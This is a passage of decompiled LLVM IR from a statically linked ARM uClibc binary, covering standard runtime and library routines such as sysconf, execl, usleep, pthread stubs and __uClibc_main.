  %v0_16bf0 = phi i32 [ %v0_16bf0.pre, %.backedge3 ], [ %v2_16b94, %dec_label_pc_16b8c ]
  %v0_16be4 = phi i32 [ %v0_16be4.pre, %.backedge3 ], [ %v1_16b80, %dec_label_pc_16b8c ]
  %v4_16bf4 = inttoptr i32 %v0_16be4 to i32*
  %v5_16bf4 = call i32 @__GI_config_read(i32* %v4_16bf4, i32 %v2_16b98, i32 258, i32 %v0_16bf0)
  %v2_16bf8 = icmp eq i32 %v5_16bf4, 0
  br i1 %v2_16bf8, label %dec_label_pc_16c68, label %dec_label_pc_16ba0

dec_label_pc_16c04:                               ; preds = %entry
  %v0_16c08 = load i32, i32* @r4, align 4
  %v2_16c08 = add i32 %v0_16c08, -2300
  store i32 %v2_16c08, i32* @r0, align 4
  %v1_16c0c = call i32 @__GI_config_open(i32 %v2_16c08)
  store i32 %v1_16c0c, i32* @r6, align 4
  %v2_16c10 = icmp eq i32 %v1_16c0c, 0
  br i1 %v2_16c10, label %bb19, label %dec_label_pc_16c1c

bb19:                                             ; preds = %dec_label_pc_16c04
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_16c68

dec_label_pc_16c1c:                               ; preds = %dec_label_pc_16c04
  %v0_16c20 = load i32, i32* @r4, align 4
  %v2_16c20 = add i32 %v0_16c20, -2284
  store i32 %v2_16c20, i32* @r8, align 4
  %v2_16c28 = add i32 %v0_16c20, -2248
  store i32 %v2_16c28, i32* @r7, align 4
  %v2_16c2c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_16c2c, i32* @r4, align 4
  br label %bb21

dec_label_pc_16c34:                               ; preds = %bb21
  %v0_16c60 = load i32, i32* @r8, align 4
  %v3_16c34 = load i32, i32* %stack_var_-36, align 4
  %v1_16c38 = inttoptr i32 %v3_16c34 to i32*
  %v2_16c38 = load i32, i32* %v1_16c38, align 4
  store i32 %v2_16c38, i32* @r1, align 4
  %v2_16c3c = inttoptr i32 %v0_16c60 to i8*
  %v3_16c3c = call i32 @__GI_strcoll(i8* %v2_16c3c, i32 %v2_16c38)
  %v2_16c40 = icmp eq i32 %v3_16c3c, 0
  br i1 %v2_16c40, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_16c34
  %v1_16c44 = load i32, i32* @r5, align 4
  %v2_16c44 = add i32 %v1_16c44, 1
  store i32 %v2_16c44, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_16c34
  %v0_16c50.pre = load i32, i32* @r7, align 4
  %v0_16c54.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_16c1c
  %v0_16c54 = phi i32 [ %v0_16c54.pre, %.backedge ], [ %v1_16c0c, %dec_label_pc_16c1c ]
  %v0_16c50 = phi i32 [ %v0_16c50.pre, %.backedge ], [ %v2_16c28, %dec_label_pc_16c1c ]
  %v4_16c58 = inttoptr i32 %v0_16c54 to i32*
  %v5_16c58 = call i32 @__GI_config_read(i32* %v4_16c58, i32 %v2_16c2c, i32 459266, i32 %v0_16c50)
  %v2_16c5c = icmp eq i32 %v5_16c58, 0
  br i1 %v2_16c5c, label %dec_label_pc_16c68, label %dec_label_pc_16c34

dec_label_pc_16c68:                               ; preds = %bb18, %bb21, %bb19
  %v0_16c68 = load i32, i32* @r6, align 4
  %v1_16c6c = inttoptr i32 %v0_16c68 to i32*
  %v2_16c6c = call i32 @__GI_config_close(i32* %v1_16c6c)
  %v0_16c70 = load i32, i32* @r5, align 4
  %v2_16c70 = icmp eq i32 %v0_16c70, 0
  %.v0_16c70 = select i1 %v2_16c70, i32 1, i32 %v0_16c70
  ret i32 %.v0_16c70

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder label %dec_label_pc_16c68, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_17094

bb:                                               ; preds = %entry
  %v7_16cc0 = mul i32 %arg1, 4
  %v8_16cc0 = add i32 %v7_16cc0, ptrtoint (i32* @global_var_16cc8.1217 to i32)
  call void @__pseudo_branch(i32 %v8_16cc0)
  br label %dec_label_pc_17094

dec_label_pc_17094:                               ; preds = %bb, %entry
  %v0_17094 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_170a0 = inttoptr i32 %v0_17094 to i32*
  store i32 22, i32* %v2_170a0, align 4
  %v0_17250 = load i32, i32* %r2.global-to-local, align 4
  ret i32 %v0_17250

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_17284 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_17284, i32* %ip.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v2_17298 = ptrtoint i32* %stack_var_-40 to i32
  %v2_1729c = ptrtoint i32* %stack_var_-8 to i32
  br label %dec_label_pc_172ac

dec_label_pc_172ac:                               ; preds = %dec_label_pc_172ac, %entry
  %v0_172c0 = phi i32 [ 0, %entry ], [ %v1_172c0, %dec_label_pc_172ac ]
  %stack_var_-36.0 = phi i32 [ %v2_1729c, %entry ], [ %v1_172b4, %dec_label_pc_172ac ]
  %v1_172b0 = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_172b0 = load i32, i32* %v1_172b0, align 4
  %v1_172b4 = add i32 %stack_var_-36.0, 4
  %v2_172b8 = icmp eq i32 %v2_172b0, 0
  %v1_172c0 = add i32 %v0_172c0, 1
  store i32 %v1_172c0, i32* @lr, align 4
  br i1 %v2_172b8, label %dec_label_pc_172c8, label %dec_label_pc_172ac

dec_label_pc_172c8:                               ; preds = %dec_label_pc_172ac
  %v3_172c8 = mul i32 %v1_172c0, 4
  %v1_172cc = add i32 %v3_172c8, 18
  %v1_172d0 = and i32 %v1_172cc, -8
  %v2_172d4 = sub i32 %v2_17298, %v1_172d0
  %v2_172dc = inttoptr i32 %v2_172d4 to i32*
  store i32 %arg2, i32* %v2_172dc, align 4
  %v0_172e8 = load i32, i32* @sp, align 4
  store i32 %v0_172e8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_172f0

dec_label_pc_172f0:                               ; preds = %dec_label_pc_172f0, %dec_label_pc_172c8
  %v1_17304 = phi i32 [ %v0_172e8, %dec_label_pc_172c8 ], [ %v5_17304, %dec_label_pc_172f0 ]
  %stack_var_-36.1 = phi i32 [ %v2_1729c, %dec_label_pc_172c8 ], [ %v1_172fc, %dec_label_pc_172f0 ]
  %v1_172f4 = inttoptr i32 %stack_var_-36.1 to i32*
  %v2_172f4 = load i32, i32* %v1_172f4, align 4
  %v0_172f8 = load i32, i32* @lr, align 4
  %v1_172f8 = add i32 %v0_172f8, -1
  store i32 %v1_172f8, i32* @lr, align 4
  %v7_172f8 = icmp eq i32 %v0_172f8, 1
  %v1_172fc = add i32 %stack_var_-36.1, 4
  %v2_17304 = add i32 %v1_17304, 4
  %v3_17304 = inttoptr i32 %v2_17304 to i32*
  store i32 %v2_172f4, i32* %v3_17304, align 4
  %v4_17304 = load i32, i32* %ip.global-to-local, align 4
  %v5_17304 = add i32 %v4_17304, 4
  store i32 %v5_17304, i32* %ip.global-to-local, align 4
  br i1 %v7_172f8, label %dec_label_pc_1730c, label %dec_label_pc_172f0

dec_label_pc_1730c:                               ; preds = %dec_label_pc_172f0
  %v0_17318 = call i32 @__GI_execve()
  ret i32 %v0_17318

; uselistorder directives
  uselistorder i32 %v5_17304, { 1, 0 }
  uselistorder i32 %v0_172f8, { 1, 0 }
  uselistorder i32 %v1_172c0, { 0, 2, 1 }
  uselistorder i32 %stack_var_-36.0, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @usleep(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_17338 = ptrtoint i32* %stack_var_-24 to i32
  %v2_17344 = udiv i32 %arg1, 1000000
  store i32 %v2_17344, i32* %stack_var_-24, align 4
  %v2_1736c = call i32 @__libc_nanosleep(i32 %v2_17338, i32 0)
  ret i32 %v2_1736c

; uselistorder directives
  uselistorder i32 (i32, i32)* @__libc_nanosleep, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_17390 = add i32 %tmp, 4
  %v4_17390 = inttoptr i32 %v3_17390 to i32*
  store i32 %arg3, i32* %v4_17390, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_1739c = icmp eq i32 %arg2, 0
  br i1 %v2_1739c, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_173a8 = add i32 %tmp, 4
  %v3_173a8 = inttoptr i32 %v2_173a8 to i32*
  %v4_173a8 = load i32, i32* %v3_173a8, align 4
  store i32 %v4_173a8, i32* %r0.global-to-local, align 4
  %v3_173ac = load i32, i32* %arg1, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %.02 = phi i32 [ %v3_173ac, %bb ], [ undef, %entry ]
  %v2_173b4 = xor i1 %v2_1739c, true
  call void @__pseudo_cond_branch(i1 %v2_173b4, i32 %.02)
  %v1_173c0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_173c0

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_173e8.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_173c4 = load i32, i32* @r4, align 4
  store i32 %v3_173c4, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_173e8

dec_label_pc_173e8:                               ; preds = %dec_label_pc_173e8.dec_label_pc_173e8_crit_edge, %dec_label_pc_173e8.lr.ph
  %v1_173e8 = phi i32 [ %v1_173f4, %dec_label_pc_173e8.dec_label_pc_173e8_crit_edge ], [ 0, %dec_label_pc_173e8.lr.ph ]
  %v0_173e8 = phi i32 [ %v0_173e8.pre, %dec_label_pc_173e8.dec_label_pc_173e8_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -8), %dec_label_pc_173e8.lr.ph ]
  %v4_173e8 = mul i32 %v1_173e8, 4
  %v5_173e8 = add i32 %v4_173e8, %v0_173e8
  %v6_173e8 = inttoptr i32 %v5_173e8 to i32*
  %v7_173e8 = load i32, i32* %v6_173e8, align 4
  call void @__pseudo_branch(i32 %v7_173e8)
  %v0_173f4 = load i32, i32* %r4.global-to-local, align 4
  %v1_173f4 = add i32 %v0_173f4, -1
  store i32 %v1_173f4, i32* %r4.global-to-local, align 4
  %v2_173f4 = icmp eq i32 %v0_173f4, 0
  br i1 %v2_173f4, label %dec_label_pc_173fc, label %dec_label_pc_173e8.dec_label_pc_173e8_crit_edge

dec_label_pc_173e8.dec_label_pc_173e8_crit_edge:  ; preds = %dec_label_pc_173e8
  %v0_173e8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_173e8

dec_label_pc_173fc:                               ; preds = %dec_label_pc_173e8
  %v0_17400.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_17400 = add i32 %v0_17400.pre, 26504
  %v3_17400 = inttoptr i32 %v2_17400 to i32*
  %v4_17400 = load i32, i32* %v3_17400, align 4
  %v2_17404 = icmp eq i32 %v4_17400, 0
  br i1 %v2_17404, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_173fc
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_173fc, %bb
  %v2_1740c = xor i1 %v2_17404, true
  call void @__pseudo_cond_branch(i1 %v2_1740c, i32 %v4_17400)
  %v0_17414 = load i32, i32* %r5.global-to-local, align 4
  %v2_17414 = add i32 %v0_17414, 26508
  %v3_17414 = inttoptr i32 %v2_17414 to i32*
  %v4_17414 = load i32, i32* %v3_17414, align 4
  %v2_17418 = icmp eq i32 %v4_17414, 0
  br i1 %v2_17418, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_17420 = xor i1 %v2_17418, true
  call void @__pseudo_cond_branch(i1 %v2_17420, i32 %v4_17414)
  %v2_17424 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17424, i32* %r4.global-to-local, align 4
  %v1_17428 = load i32, i32* @r0, align 4
  ret i32 %v1_17428

; uselistorder directives
  uselistorder i32 %v1_173f4, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_17454 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_1745c = icmp eq i32 %v2_17454, -1
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @r3, align 4
  br i1 %v3_1745c, label %dec_label_pc_17468, label %dec_label_pc_17480

dec_label_pc_17468:                               ; preds = %entry
  %v0_1746c = load i32, i32* %r5.global-to-local, align 4
  %v2_17474 = call i32 @__GI_open(i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -2244), i32 %v0_1746c)
  %v1_17478 = load i32, i32* %r4.global-to-local, align 4
  %v1_1747c = icmp ne i32 %v2_17474, %v1_17478
  call void @__pseudo_cond_branch(i1 %v1_1747c, i32 ptrtoint (i32* @global_var_160d0.1237 to i32))
  br label %dec_label_pc_17480

dec_label_pc_17480:                               ; preds = %entry, %dec_label_pc_17468
  %v1_17488 = phi i32 [ %v2_17454, %entry ], [ %v2_17474, %dec_label_pc_17468 ]
  ret i32 %v1_17488

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_open, { 0, 3, 4, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_17480, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r4.global-to-local, align 4
  %v4_174a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 100) to i32*), align 4
  %v1_174a8 = inttoptr i32 %v4_174a4 to i32*
  %v2_174a8 = load i32, i32* %v1_174a8, align 4
  %v2_174ac = icmp eq i32 %v2_174a8, 0
  br i1 %v2_174ac, label %dec_label_pc_174b4, label %dec_label_pc_174e8

dec_label_pc_174b4:                               ; preds = %entry
  %v4_174b8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 60) to i32*), align 4
  %v2_174c0 = icmp eq i32 %v4_174b8, 0
  store i32 4096, i32* %v1_174a8, align 4
  br i1 %v2_174c0, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_174b4
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_174b4, %bb
  %v2_174cc = xor i1 %v2_174c0, true
  call void @__pseudo_cond_branch(i1 %v2_174cc, i32 %v4_174b8)
  %v0_174d4 = load i32, i32* %r4.global-to-local, align 4
  %v2_174d4 = add i32 %v0_174d4, -88148
  %v2_174dc = icmp eq i32 %v2_174d4, 0
  br i1 %v2_174dc, label %bb6, label %bb5

bb5:                                              ; preds = %bb4
  br label %bb6

bb6:                                              ; preds = %bb4, %bb5
  %v2_174e4 = xor i1 %v2_174dc, true
  call void @__pseudo_cond_branch(i1 %v2_174e4, i32 %v2_174d4)
  br label %dec_label_pc_174e8

dec_label_pc_174e8:                               ; preds = %entry, %bb6
  %v1_174ec = load i32, i32* @r0, align 4
  ret i32 %v1_174ec

; uselistorder directives
  uselistorder label %dec_label_pc_174e8, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %tmp50 = call i32 @__decompiler_undefined_function_0()
  %tmp51 = call i32 @__decompiler_undefined_function_0()
  %tmp52 = call i32 @__decompiler_undefined_function_0()
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r7, align 4
  %v1_17508 = add i32 %tmp, 4
  store i32 %v1_17508, i32* %ip.global-to-local, align 4
  %v2_1750c = load i32, i32* %arg3, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @r6, align 4
  %v3_17518 = mul i32 %arg2, 4
  store i32 %v3_17518, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v4_17520 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 24) to i32*), align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_17528 = ptrtoint i32* %stack_var_-120 to i32
  %v4_1752c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 32) to i32*), align 4
  store i32 %v4_1752c, i32* %r4.global-to-local, align 4
  %v2_17534 = add i32 %v1_17508, %v3_17518
  store i32 %v2_17534, i32* %ip.global-to-local, align 4
  %v9_17538 = icmp eq i32 %v2_17534, %v2_1750c
  store i1 %v9_17538, i1* %cpsr_z.global-to-local, align 1
  %v2_1753c = inttoptr i32 %v4_17520 to i32*
  store i32 %arg7, i32* %v2_1753c, align 4
  store i32 26508, i32* %r2.global-to-local, align 4
  %v0_17548 = load i32, i32* %r3.global-to-local, align 4
  br i1 %v9_17538, label %bb, label %.critedge

bb:                                               ; preds = %entry
  %v1_1754c = load i32, i32* @r7, align 4
  %v2_1754c = load i32, i32* %r5.global-to-local, align 4
  %v3_1754c = add i32 %v2_1754c, %v1_1754c
  store i32 %v3_1754c, i32* %r3.global-to-local, align 4
  %v1_17550 = load i32, i32* @r6, align 4
  %v3_17550 = add i32 %v1_17550, 26508
  %v4_17550 = inttoptr i32 %v3_17550 to i32*
  store i32 %arg6, i32* %v4_17550, align 4
  %v0_17554 = load i32, i32* %ip.global-to-local, align 4
  %v1_17554 = load i32, i32* %r4.global-to-local, align 4
  %v2_17554 = inttoptr i32 %v1_17554 to i32*
  store i32 %v0_17554, i32* %v2_17554, align 4
  store i32 120, i32* @r2, align 4
  %v1_17560 = load i32, i32* %r3.global-to-local, align 4
  %v2_17560 = load i32, i32* %r4.global-to-local, align 4
  %v3_17560 = inttoptr i32 %v2_17560 to i32*
  store i32 %v1_17560, i32* %v3_17560, align 4
  br label %bb58

.critedge:                                        ; preds = %entry
  %v1_17550.c = load i32, i32* @r6, align 4
  %v3_17550.c = add i32 %v1_17550.c, 26508
  %v4_17550.c = inttoptr i32 %v3_17550.c to i32*
  store i32 %arg6, i32* %v4_17550.c, align 4
  %v0_17554.c = load i32, i32* %ip.global-to-local, align 4
  %v1_17554.c = load i32, i32* %r4.global-to-local, align 4
  %v2_17554.c = inttoptr i32 %v1_17554.c to i32*
  store i32 %v0_17554.c, i32* %v2_17554.c, align 4
  store i32 120, i32* @r2, align 4
  br label %bb58

bb58:                                             ; preds = %.critedge, %bb
  %v2_1756c = bitcast i32* %stack_var_-120 to i8*
  %v3_1756c = call i32 @__GI_memset(i8* %v2_1756c, i32 0)
  %v0_17570 = load i32, i32* %r4.global-to-local, align 4
  %v1_17570 = inttoptr i32 %v0_17570 to i32*
  %storemerge.pre = load i32, i32* %v1_17570, align 4
  br label %dec_label_pc_1757c

dec_label_pc_1757c:                               ; preds = %dec_label_pc_1757c, %bb58
  %storemerge = phi i32 [ %storemerge.pre, %bb58 ], [ %v4_1757c, %dec_label_pc_1757c ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_1757c = inttoptr i32 %storemerge to i32*
  %v2_1757c = load i32, i32* %v1_1757c, align 4
  store i32 %v2_1757c, i32* %r3.global-to-local, align 4
  %v4_1757c = add i32 %storemerge, 4
  store i32 %v4_1757c, i32* %r2.global-to-local, align 4
  %v2_17580 = icmp eq i32 %v2_1757c, 0
  br i1 %v2_17580, label %dec_label_pc_1758c, label %dec_label_pc_1757c

dec_label_pc_1758c:                               ; preds = %dec_label_pc_1757c
  store i32 %v4_1757c, i32* @r4, align 4
  store i32 %v2_17528, i32* @r5, align 4
  %v1_175b029 = inttoptr i32 %v4_1757c to i32*
  %v2_175b030 = load i32, i32* %v1_175b029, align 4
  store i32 %v2_175b030, i32* %r3.global-to-local, align 4
  %v2_175b432 = icmp eq i32 %v2_175b030, 0
  store i1 %v2_175b432, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_175b432, label %dec_label_pc_175bc, label %dec_label_pc_17598

dec_label_pc_17598:                               ; preds = %dec_label_pc_1758c, %dec_label_pc_175b0
  %v5_1759c = phi i32 [ %v2_175b0, %dec_label_pc_175b0 ], [ %v2_175b030, %dec_label_pc_1758c ]
  %v2_17598 = icmp ugt i32 %v5_1759c, 13
  %v7_17598 = icmp eq i32 %v5_1759c, 14
  store i1 %v7_17598, i1* %cpsr_z.global-to-local, align 1
  %v2_1759c = xor i1 %v2_17598, true
  %v3_1759c = or i1 %v7_17598, %v2_1759c
  br i1 %v3_1759c, label %bb59, label %bb60

bb59:                                             ; preds = %dec_label_pc_17598
  %v6_1759c = and i32 %v5_1759c, 536870912
  %v7_1759c = icmp ne i32 %v6_1759c, 0
  br label %bb60

bb60:                                             ; preds = %dec_label_pc_17598, %bb59
  %v1_175a8 = phi i1 [ %v2_17598, %dec_label_pc_17598 ], [ %v7_1759c, %bb59 ]
  %v2_175a0 = xor i1 %v1_175a8, true
  %v3_175a0 = or i1 %v7_17598, %v2_175a0
  br i1 %v3_175a0, label %bb61, label %dec_label_pc_175b0

bb61:                                             ; preds = %bb60
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_175b0

dec_label_pc_175b0:                               ; preds = %bb60, %bb61
  call void @__pseudo_cond_branch(i1 %v3_175a0, i32 ptrtoint (i32* @global_var_142c0.1247 to i32))
  %v0_175ac = load i32, i32* @r4, align 4
  %v1_175ac = add i32 %v0_175ac, 8
  store i32 %v1_175ac, i32* @r4, align 4
  %v1_175b0 = inttoptr i32 %v1_175ac to i32*
  %v2_175b0 = load i32, i32* %v1_175b0, align 4
  store i32 %v2_175b0, i32* %r3.global-to-local, align 4
  %v2_175b4 = icmp eq i32 %v2_175b0, 0
  store i1 %v2_175b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_175b4, label %dec_label_pc_175bc, label %dec_label_pc_17598

dec_label_pc_175bc:                               ; preds = %dec_label_pc_175b0, %dec_label_pc_1758c
  %v1_175c0 = call i32 @_dl_aux_init(i32 %v2_17528)
  store i32 %v1_175c0, i32* @r0, align 4
  %v1_175c4 = call i32 @__GI___uClibc_init(i32 %v1_175c0)
  store i32 %v1_175c4, i32* @r0, align 4
  store i32 100, i32* %r3.global-to-local, align 4
  store i32 %tmp54, i32* @r2, align 4
  %v0_175d0 = load i32, i32* @r6, align 4
  %v2_175d0 = add i32 %v0_175d0, 100
  %v3_175d0 = inttoptr i32 %v2_175d0 to i32*
  %v4_175d0 = load i32, i32* %v3_175d0, align 4
  store i32 %tmp53, i32* @r3, align 4
  %v2_175d8 = icmp eq i32 %tmp54, 0
  store i1 %v2_175d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_175d8, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_175bc
  store i32 4096, i32* @r2, align 4
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_175bc, %bb62
  %v0_175e4 = phi i32 [ %tmp54, %dec_label_pc_175bc ], [ 4096, %bb62 ]
  %v3_175e0 = icmp eq i32 %tmp53, -1
  %v8_175e0 = icmp eq i32 %tmp53, -1
  store i1 %v8_175e0, i1* %cpsr_z.global-to-local, align 1
  %v2_175e4 = inttoptr i32 %v4_175d0 to i32*
  store i32 %v0_175e4, i32* %v2_175e4, align 4
  br i1 %v3_175e0, label %dec_label_pc_175ec, label %dec_label_pc_17614

dec_label_pc_175ec:                               ; preds = %bb63
  %v0_175ec = call i32 @getuid()
  store i32 %v0_175ec, i32* @r0, align 4
  store i32 %v0_175ec, i32* @r4, align 4
  %v0_175f4 = call i32 @geteuid()
  store i32 %v0_175f4, i32* @r0, align 4
  %v0_175f8 = load i32, i32* @r4, align 4
  %v9_175f8 = icmp eq i32 %v0_175f8, %v0_175f4
  store i1 %v9_175f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_175f8, label %dec_label_pc_17600, label %dec_label_pc_1763c

dec_label_pc_17600:                               ; preds = %dec_label_pc_175ec
  %v1_17600 = call i32 @getgid(i32 %v0_175f4)
  store i32 %v1_17600, i32* @r0, align 4
  store i32 %v1_17600, i32* @r4, align 4
  %v0_17608 = call i32 @getegid()
  store i32 %v0_17608, i32* @r0, align 4
  %v0_1760c = load i32, i32* @r4, align 4
  %v9_1760c = icmp eq i32 %v0_1760c, %v0_17608
  store i1 %v9_1760c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1760c, label %dec_label_pc_17614, label %dec_label_pc_1763c

dec_label_pc_17614:                               ; preds = %dec_label_pc_17600, %bb63
  store i32 %tmp53, i32* @r2, align 4
  store i1 %v8_175e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_175e0, label %dec_label_pc_17660, label %dec_label_pc_17620

dec_label_pc_17620:                               ; preds = %dec_label_pc_17614
  store i32 %tmp52, i32* @r3, align 4
  %v9_17624 = icmp eq i32 %tmp53, %tmp52
  store i1 %v9_17624, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_17624, label %dec_label_pc_1762c, label %dec_label_pc_1763c

dec_label_pc_1762c:                               ; preds = %dec_label_pc_17620
  store i32 %tmp51, i32* @r2, align 4
  store i32 %tmp50, i32* @r3, align 4
  %v9_17634 = icmp eq i32 %tmp51, %tmp50
  store i1 %v9_17634, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_17634, label %dec_label_pc_17660, label %dec_label_pc_1763c

dec_label_pc_1763c:                               ; preds = %dec_label_pc_17620, %dec_label_pc_17600, %dec_label_pc_175ec, %dec_label_pc_1762c
  %v2_17644 = call i32 @__check_one_fd(i32 0, i32 32768)
  %v2_17650 = call i32 @__check_one_fd(i32 1, i32 32770)
  %v2_1765c = call i32 @__check_one_fd(i32 2, i32 32770)
  store i32 %v2_1765c, i32* @r0, align 4
  br label %dec_label_pc_17660

dec_label_pc_17660:                               ; preds = %dec_label_pc_1762c, %dec_label_pc_17614, %dec_label_pc_1763c
  %v0_17660 = load i32, i32* @r7, align 4
  %v1_17660 = inttoptr i32 %v0_17660 to i32*
  %v2_17660 = load i32, i32* %v1_17660, align 4
  store i32 %v2_17660, i32* %r2.global-to-local, align 4
  store i32 1320, i32* %r3.global-to-local, align 4
  %v1_17668 = load i32, i32* @r6, align 4
  %v3_17668 = add i32 %v1_17668, 1320
  %v4_17668 = inttoptr i32 %v3_17668 to i32*
  store i32 %v2_17660, i32* %v4_17668, align 4
  %v0_1766c = load i32, i32* @r7, align 4
  %v1_1766c = inttoptr i32 %v0_1766c to i32*
  %v2_1766c = load i32, i32* %v1_1766c, align 4
  store i32 %v2_1766c, i32* @r4, align 4
  %v2_17670 = icmp eq i32 %v2_1766c, 0
  store i1 %v2_17670, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17670, label %bb65, label %dec_label_pc_17678

dec_label_pc_17678:                               ; preds = %dec_label_pc_17660
